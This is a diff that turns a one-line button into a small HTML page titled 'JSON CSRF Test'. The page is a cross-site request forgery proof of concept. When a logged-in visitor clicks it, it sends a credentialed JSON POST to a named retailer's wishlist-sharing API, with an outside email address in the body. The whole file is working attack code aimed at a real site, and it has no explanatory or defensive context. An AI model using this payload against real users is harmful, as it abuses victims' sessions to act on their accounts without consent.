@@ -1,3 +1,33 @@
-<button onclick='fetch("https://api.iciparisxl.lu/api/v2/icilu3/forms/share-wishlist-form/steps/share-wishlist/validation?lang=fr_LU&curr=EUR",{method:"POST",credentials:"include",headers:{"Content-Type":"application/json"},body:`{"email":"testerr0092@gmail.com"}`})'>
-    Submit 
-</button>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>JSON CSRF Test</title>
+</head>
+<body>
+
+<h2>Click to test CSRF</h2>
+
+<button onclick="csrf()">Submit Request</button>
+
+<script>
+function csrf() {
+    fetch(
+        "https://api.iciparisxl.lu/api/v2/icilu3/forms/share-wishlist-form/steps/share-wishlist/validation?lang=fr_LU&curr=EUR",
+        {
+            method: "POST",
+            credentials: "include",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                email: "testerr0092@gmail.com"
+            })
+        }
+    )
+    .then(response => console.log(response))
+    .catch(error => console.log(error));
+}
+</script>
+
+</body>
+</html>
